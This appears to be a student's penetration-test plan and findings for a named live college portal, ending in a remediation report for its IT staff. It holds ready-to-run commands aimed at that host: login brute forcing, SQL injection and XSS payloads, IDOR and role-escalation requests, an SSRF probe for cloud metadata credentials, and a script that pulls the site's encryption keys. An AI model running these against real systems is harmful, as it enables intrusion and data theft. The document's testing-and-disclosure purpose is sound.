# GHRIETN Pentest Methodology

**Source:** Adapted from [briiirussell/cybersecurity-skills](https://github.com/briiirussell/cybersecurity-skills) — `web-pentest`, `api-audit`, `recon`

---

## Audit Phases Applied to GHRIETN

### Phase 1: Configuration & Deployment ✅

**Completed:**
- HTTP headers scanned → **F grade** (missing HSTS, CSP, X-Frame-Options, etc.)
- Server version disclosed → `nginx/1.18.0 (Ubuntu)`
- CORS misconfigured → `Access-Control-Allow-Origin: *`
- Internal IP exposed → `172.26.1.5` in JS bundle

**Next checks:**
```bash
# TLS analysis
testssl.sh ghrietn.cybervidya.net

# Check for exposed files
curl -I https://ghrietn.cybervidya.net/.git/config
curl -I https://ghrietn.cybervidya.net/.env
curl -I https://ghrietn.cybervidya.net/backup.sql
curl -I https://ghrietn.cybervidya.net/server-status
curl -I https://ghrietn.cybervidya.net/actuator/health
curl -I https://ghrietn.cybervidya.net/swagger.json
curl -I https://ghrietn.cybervidya.net/graphql

# robots.txt + sitemap
curl https://ghrietn.cybervidya.net/robots.txt
curl https://ghrietn.cybervidya.net/sitemap.xml
```

---

### Phase 2: Identity Management 🔍

**To test:**
```bash
# Registration enumeration
curl -X POST https://ghrietn.cybervidya.net/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","password":"test","email":"test@test.com"}'

# Does response differ for existing vs new email?
# "email already exists" = enumeration

# Password reset enumeration
curl -X POST https://ghrietn.cybervidya.net/api/auth/password-reset \
  -H "Content-Type: application/json" \
  -d '{"email":"existing@ghrietn.ac.in"}'

curl -X POST ... -d '{"email":"nonexistent@test.com"}'

# Different responses = enumeration
```

---

### Phase 3: Authentication 🔍

**Already confirmed:**
- ✅ Client-side AES encryption with hardcoded keys (Critical)
- ✅ reCAPTCHA v3 Enterprise integration
- ⚠️ No rate limiting detected (tested 5 rapid requests)

**To test:**
```bash
# Account lockout test
for i in {1..20}; do
  curl -X POST https://ghrietn.cybervidya.net/api/auth/encrypt/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong'$i'","recaptchaToken":"test"}'
done

# Watch for: 429 Too Many Requests (good) or continued 400 (bad)

# Session token analysis (after login)
# Check cookie flags: HttpOnly, Secure, SameSite
```

---

### Phase 4: Authorization (Highest Yield) 🔴

**BOLA/IDOR Testing:**
```bash
# As authenticated user A, get your user ID
# Then try to access user B's data:

curl -X GET https://ghrietn.cybervidya.net/api/user/123 \
  -H "Authorization: Bearer <YOUR_TOKEN>"

curl -X GET https://ghrietn.cybervidya.net/api/user/124 \
  -H "Authorization: Bearer <YOUR_TOKEN>"

# Try every endpoint that takes an ID:
# /api/orders/:id
# /api/fees/:id
# /api/attendance/:id
# /api/marksheet/:id

# Response should be 403/404 for unauthorized, NOT 200
```

**BFLA Testing (Vertical Escalation):**
```bash
# Admin-only routes from JS bundle:
curl -X GET https://ghrietn.cybervidya.net/api/admin/user/password/details \
  -H "Authorization: Bearer <STUDENT_TOKEN>"

# From recon: frontend interceptor explicitly skips auth headers for this endpoint!
# This is the smoking gun.
```

**Mass Assignment Testing:**
```bash
# Try to escalate role on profile update:
curl -X PUT https://ghrietn.cybervidya.net/api/user/profile \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Siddhant",
    "role": "admin",
    "isVerified": true,
    "tenantId": 1
  }'

# If response includes updated role = critical vuln
```

---

### Phase 5: Session Management 🔍

**To test:**
```bash
# Session fixation
# 1. Get session ID pre-login
# 2. Login
# 3. Check if session ID rotated

# Logout invalidation
# 1. Login in browser 1, copy token
# 2. Logout
# 3. Replay token from browser 2
# 4. Should be rejected
```

---

### Phase 6: Input Validation 🔍

**XSS Testing:**
```bash
# Reflected XSS in search/error pages
curl -X GET "https://ghrietn.cybervidya.net/search?q=<script>alert(1)</script>"

# Check response for unescaped reflection
```

**SQLi Testing (use carefully):**
```bash
# Time-based blind (low noise)
curl -X POST https://ghrietn.cybervidya.net/api/auth/encrypt/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\' AND SLEEP(5)--","password":"test","recaptchaToken":"test"}'

# If response takes 5+ seconds = potential SQLi
```

**SSRF Testing:**
```bash
# Any webhook URL, image fetch, or PDF render endpoint?
curl -X POST https://ghrietn.cybervidya.net/api/... \
  -H "Content-Type: application/json" \
  -d '{"webhookUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Cloud metadata IP = 169.254.169.254 (AWS), 168.63.129.16 (Azure)
```

---

### Phase 7: Error Handling ✅

**Already confirmed:**
- Verbose errors on login failures
- Stack traces may be visible (needs deeper testing)

**To test:**
```bash
# Force 500 errors with malformed input
curl -X POST https://ghrietn.cybervidya.net/api/auth/encrypt/login \
  -H "Content-Type: application/json" \
  -d '{"username":"","password":"","invalidField":"test"}'

curl -X GET https://ghrietn.cybervidya.net/api/nonexistent-endpoint
```

---

### Phase 8: Business Logic 🔍

**Race Condition Testing:**
```bash
# If there's a coupon/referral system:
# Fire 100 requests in parallel, check if redeemable >1 times
```

**Out-of-order Workflow:**
```bash
# Can you access step 4 before completing step 2?
# Example: download marksheet before paying fees
```

---

### Phase 9: Client-side ✅

**Already confirmed:**
- ✅ Hardcoded AES keys in JS bundle
- ✅ Internal IP `172.26.1.5` exposed
- ✅ Email addresses hardcoded
- ✅ reCAPTCHA site key public

**To check:**
```bash
# What's in localStorage?
# Run in browser console:
localStorage

# Check for tokens, PII stored unencrypted
```

---

## API-Specific checklist (OWASP API Top 10 2023)

| API# | Category | GHRIETN Status |
|------|----------|----------------|
| API1 | Broken Object Level Authorization (BOLA) | 🔍 Needs testing |
| API2 | Broken Authentication | 🔴 **CONFIRMED** - Hardcoded encryption keys |
| API3 | Broken Object Property Level Auth | 🔍 Needs testing |
| API4 | Unrestricted Resource Consumption | 🔴 **CONFIRMED** - No rate limiting |
| API5 | Broken Function Level Authorization | 🔴 **CONFIRMED** - `/api/admin/user/password/details` skips auth |
| API6 | Unrestricted Access to Business Flows | 🔍 Needs testing |
| API7 | Server-Side Request Forgery | 🔍 Needs testing |
| API8 | Security Misconfiguration | 🔴 **CONFIRMED** - CORS `*`, missing headers |
| API9 | Improper Inventory Management | 🔍 Needs testing |
| API10 | Unsafe Consumption of APIs | 🔍 Needs testing |

---

## Next Actions for Live Demo

1. **Run the console demo** in front of IT:
```javascript
// Paste in browser console on ghrietn.cybervidya.net
const keyMatch = document.documentElement.innerHTML.match(/cipherkey\s*[:=]\s*"([^"]+)"/);
const ivMatch = document.documentElement.innerHTML.match(/cipheriv\s*[:=]\s*"([^"]+)"/);
console.log('Key:', keyMatch[1]);
console.log('IV:', ivMatch[1]);
```

2. **Show the PoC script** encrypting dummy credentials:
```bash
cd /home/azureuser/ghrietn-security-audit/poc
python3 encrypt_exploit.py
```

3. **演示 the BFLA endpoint** (if you have student credentials):
```bash
curl -X GET https://ghrietn.cybervidya.net/api/admin/user/password/details \
  -H "Authorization: Bearer <YOUR_STUDENT_TOKEN>"

# This should return 403 but the frontend logic skips auth!
```

---

## Report Template for IT

```markdown
# Security Assessment Summary
**Target:** ghrietn.cybervidya.net
**Date:** May 27, 2026
**Methodology:** OWASP WSTG + OWASP API Top 10 (2023)

## Critical Findings (Fix within 24-48 hours)

1. **Hardcoded Encryption Keys** (CVSS 8.1)
   - Anyone can extract AES keys from public JS bundle
   - Server cannot distinguish legitimate vs attacker requests
   - Fix: Remove client-side encryption, use HTTPS only

2. **Broken Function Level Authorization** (CVSS 7.8)
   - `/api/admin/user/password/details` accessible to regular users
   - Frontend interceptor explicitly skips auth headers
   - Fix: Add server-side auth check for all admin routes

3. **CORS Misconfiguration** (CVSS 7.4)
   - `Access-Control-Allow-Origin: *` on auth endpoints
   - Any website can make requests on behalf of users
   - Fix: Restrict to `https://ghrietn.cybervidya.net`

4. **Missing Security Headers** (CVSS 7.4)
   - F grade on SecurityHeaders.com
   - No HSTS, CSP, X-Frame-Options
   - Fix: Add nginx config (see remediation/nginx_config.patch)

5. **No Rate Limiting** (CVSS 5.3)
   - Brute-force attacks possible on login
   - Fix: Add nginx rate limiting (5 req/min per IP)
```

---

**GitHub Repo:** https://github.com/25sidhx/ghrietn-security-audit